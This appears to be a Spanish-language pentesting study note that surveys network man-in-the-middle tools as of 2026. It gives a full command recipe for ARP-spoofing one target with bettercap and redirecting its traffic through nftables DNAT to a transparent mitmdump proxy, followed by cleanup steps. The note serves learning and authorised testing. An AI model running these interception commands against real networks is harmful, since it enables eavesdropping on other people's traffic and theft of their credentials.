---
tags:
  - MITM
  - Redes
  - Tipo/Arsenal
Descripción: "Herramientas de interposición en red verificadas a 2026, con el estado real de Ettercap y bettercap y una receta completa de MITM sobre protocolo binario"
Fecha de actualización: 2026-08-03
Nota previa: "[[05 - Detección y evasión del MITM de capa 2]]"
Nota siguiente: 
Area: "[[MITM de red.base|MITM de red]]"
---
---

Estado verificado el **2026-08-03** contra la API de GitHub y los repositorios oficiales. Empezando por deshacer un mito extendido.

## Suites de MITM

| Herramienta | Estado real | Para qué |
| - | - | - |
| **bettercap** | **v2.41.7** (2026-05-11), muy activo | Suite completa: ARP/DNS/DHCPv6 spoof, sniffing, proxies HTTP(S), caplets programables. **El estándar hoy** |
| **Ettercap** | **v0.8.4.1 «Garofalo»** (2026-04-07) | <mark style="background: #FFB8EBA6;">No está abandonado</mark>, contra lo que suele decirse. Filtros propios, GUI, ARP y DHCP spoofing. Es lo que usa el libro y sigue funcionando |
| **dsniff** (`arpspoof`, `dnsspoof`) | Estancado, funcional | Utilidades mínimas de un solo propósito. Cuando quieres exactamente una cosa |
| **Responder** | Muy activo | LLMNR/NBT-NS/mDNS/WPAD. **Imprescindible en redes Windows** |
| **mitm6** | Activo | RA + DHCPv6 spoofing. El vector IPv6 ([[03 - IPv6 - RA spoofing y DHCPv6 con mitm6]]) |
| **THC-IPv6** | Mantenimiento | `fake_router6`, `parasite6`, `flood_router26` |

> [!important]+ Corrección al *tooling* del libro
> *Attacking Network Protocols* usa **Ettercap en modo GUI** para ARP y DHCP spoofing. Ese flujo **sigue siendo válido** — Ettercap tuvo release en abril de 2026. Lo que ha cambiado es que `bettercap` ofrece lo mismo con mejor ergonomía, *scripting* mediante *caplets* y módulos que Ettercap no tiene (proxies HTTP/HTTPS integrados, spoofing DHCPv6). Y lo que el libro **no cubre en absoluto es IPv6**, que es hoy el vector más rentable.

## Servicios falsos

| Herramienta | Uso |
| - | - |
| **dnsmasq** | DHCP + DNS en un binario. Ideal para repartir gateway, DNS y WPAD |
| **dnschef** | DNS falso con reglas por dominio y tipo de registro; muy cómodo para spoofing selectivo |
| **hostapd-wpe** | AP falso con captura de credenciales 802.1X ([[Wi-Fi Pentesting.base\|Wi-Fi]]) |

## Interposición y análisis del tráfico ya desviado

Una vez el tráfico pasa por ti, el trabajo lo hacen las herramientas de [[09 - Arsenal de análisis de protocolos]]: `mitmproxy` para interceptar y reescribir, `socat` para *port-forward*, `Wireshark`/`tcpdump` para capturar y `Scapy` para construir paquetes a medida.

## Receta completa: MITM sobre un protocolo binario

El caso de uso que justifica toda esta área — interponerse en un dispositivo que no se puede reconfigurar.

```shell-session
# 0) Reconocimiento: quién habla con quién
$ sudo bettercap -iface eth0 -eval "net.probe on; net.show; q"

# 1) Preparar la máquina como router
$ sudo sysctl -w net.ipv4.conf.all.forwarding=1
$ sudo nft add table ip nat
$ sudo nft 'add chain ip nat postrouting { type nat hook postrouting priority srcnat; }'
$ sudo nft add rule ip nat postrouting oifname "eth0" masquerade

# 2) Desviar el tráfico del objetivo hacia tu proxy local
$ sudo nft 'add chain ip nat prerouting { type nat hook prerouting priority dstnat; }'
$ sudo nft add rule ip nat prerouting ip saddr 192.168.1.5 ip daddr 10.10.10.5 \
      tcp dport 12345 dnat to 192.168.1.50:4444

# 3) Levantar el proxy que va a analizar y reescribir
$ mitmdump --mode transparent --set connection_strategy=lazy -s parser.py &

# 4) Envenenar SOLO al objetivo y a su gateway
$ sudo bettercap -iface eth0 -eval \
    "set arp.spoof.targets 192.168.1.5; set arp.spoof.fullduplex true; arp.spoof on"

# 5) Verificar que el tráfico realmente pasa
$ sudo conntrack -L | grep 12345
```

Los dos puntos donde falla en la práctica: **olvidar el `forwarding`** (el objetivo se queda sin red al instante) y **usar `PREROUTING` para tráfico local** ([[00 - Ponerse en el camino - routing, NAT y forwarding]]).

## Al terminar: limpiar

```shell-session
$ sudo nft flush ruleset                        # o 'nft delete table ip nat'
$ sudo sysctl -w net.ipv4.conf.all.forwarding=0
$ sudo sysctl -w net.ipv6.conf.all.forwarding=0
```

Y salir de `bettercap`/`ettercap` con `Ctrl+C` para que reenvíen las asociaciones ARP correctas. Matarlos con `kill -9` deja la red envenenada hasta que caduquen las cachés.

> [!info]+ Fuentes
> - Versiones verificadas el 2026-08-03 contra `api.github.com/repos/{bettercap/bettercap,Ettercap/ettercap}/releases/latest`.
> - [bettercap — documentación de módulos](https://www.bettercap.org/modules/).
> - [Responder](https://github.com/lgandx/Responder) y [mitm6](https://github.com/dirkjanm/mitm6).
